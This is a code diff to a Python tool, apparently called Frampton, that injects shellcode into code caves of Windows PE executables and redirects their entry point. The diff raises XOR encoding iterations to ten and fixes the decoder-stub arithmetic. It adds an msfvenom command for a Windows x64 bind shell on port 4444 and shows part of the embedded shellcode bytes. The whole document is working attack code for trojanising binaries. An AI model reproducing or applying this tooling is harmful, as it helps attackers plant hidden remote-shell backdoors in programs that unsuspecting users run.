@@ -99,7 +99,7 @@ def FindCave():
     else:
         filedata = open(file, "rb")
 
-    print(PrintBlue("[i]") + " Min Cave Size: \t\t" + str(4 + len(shellcode)) + " bytes")
+    print(PrintBlue("[i]") + " Min Cave Size: \t\t" + str(minCave) + " bytes")
 
     # Set PE file Image Base
     image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)
@@ -151,11 +151,7 @@ def FindCave():
                     count = 0
         sectionCount += 1
 
-    # if caveFound is False:
-    #     print(PrintRed("[!]") + " No Viable Code Cave Found")
-
     filedata.close()
-
 
 # Frampton banner
 banner = (
@@ -182,6 +178,7 @@ aslr = False
 # Global var for x64
 x64 = False
 
+# msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 EXITFUNC=none -b '\x00' -i 0 -f c
 shellcode64 = bytes (
 b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
 b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -284,9 +281,11 @@ print(PrintBlue("[i]") + " Entry Point:\t\t" + entrypoint)
 
 # Find Code Cave
 if args.encoder:
-    minCave = len(shellcode) + 25
+    minCave = (4 + len(shellcode)) + 24
+    if args.encodermultiple:
+        minCave = minCave + ((args.encodermultiple - 1) * 3)
 else:
-    minCave = len(shellcode) + 20
+    minCave = minCave + 20
 
 try:
     newEntryPoint, newRawOffset = FindCave()
@@ -299,8 +298,8 @@ origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint)
 # Perform injection - Info not set
 if args.info is False:
 
-    if len(shellcode) < 10:
-        sys.exit(PrintRed("[!]") + " Minimum shellcode size 10 bytes")
+    if len(shellcode) < 8:
+        sys.exit(PrintRed("[!]") + " Minimum shellcode size 8 bytes")
 
     # Sets new Entry Point and aligns address
     aslr_ep = newEntryPoint - image_base
@@ -333,8 +332,9 @@ if args.info is False:
 
         if args.encodermultiple:
             encoderCount = args.encodermultiple
-            if encoderCount > 4:
-                encoderCount = 4
+            if encoderCount > 10:
+                encoderCount = 10
+                print(PrintRed("[!]") + " Max Encoding:\t\tx10 Iterations")
 
             xorInstructions = b""
             for x in range(encoderCount):
@@ -344,8 +344,7 @@ if args.info is False:
                 print("\tXOR Key:\t\t\\x" + encodingKey.hex().upper())
                 encodedShellcode = (xor(encodedShellcode, encodingKey))
 
-            endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16) + int(
-                hex((encoderCount - 1) * 3), 16)
+            endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16) + ((encoderCount - 1) * 3)
             if x64:
                 startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))
             else:
@@ -367,34 +366,31 @@ if args.info is False:
             endDecodeAddressLittle = (endDecodeAddress + 15).to_bytes(4, 'little')
 
 
-        print("\tStart address:\t\t" + (hex(int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))))#hex(newEntryPoint))
+        print("\tStart address:\t\t" + (hex(int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))))
         print("\tEnd Address:\t\t" + hex(endDecodeAddress))
 
         if x64:
-
-            xorDecoder = b"\x48\xb8" + startDecodeAddress.to_bytes(8, 'little') # (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16))
+            xorDecoder = b"\x48\xb8" + startDecodeAddress.to_bytes(8, 'little')
             xorDecoder += xorInstructions
-            #xorDecoder += b"\x80\x30" + encodingKey
             xorDecoder += b"\x48\xFF\xC0"
             xorDecoder += b"\x3D" + endDecodeAddressLittle[:4]
 
             # JMP Short\xf3 default 1 key
             shortJmp = 0xf3
-            shortJmp = shortJmp - (int(str((encoderCount - 1)  * 3), 16))
+            shortJmp = shortJmp - (int(str((encoderCount - 1)  * 3)))
             xorDecoder += b"\x7e" + shortJmp.to_bytes(1, 'little') #"\xf3"
 
             shellcode = xorDecoder + encodedShellcode
 
         else:
-            xorDecoder = b"\xB8" + startDecodeAddress.to_bytes(4, 'little') #(int(hex(newEntryPoint),16) + int(hex(0x14),16))
+            xorDecoder = b"\xB8" + startDecodeAddress.to_bytes(4, 'little')
             xorDecoder += xorInstructions
-            #xorDecoder += b"\x80\x30" + encodingKey
             xorDecoder += b"\x40"
             xorDecoder += b"\x3d" + endDecodeAddressLittle
 
             # JMP Short\xf5 default 1 key
             shortJmp = 0xf5
-            shortJmp = shortJmp - (int(str(encoderCount - 1), 16) * 3)
+            shortJmp = shortJmp - ((encoderCount - 1) * 3)
             xorDecoder += b"\x7e" + shortJmp.to_bytes(1, 'little')
             shellcode = xorDecoder + encodedShellcode
 
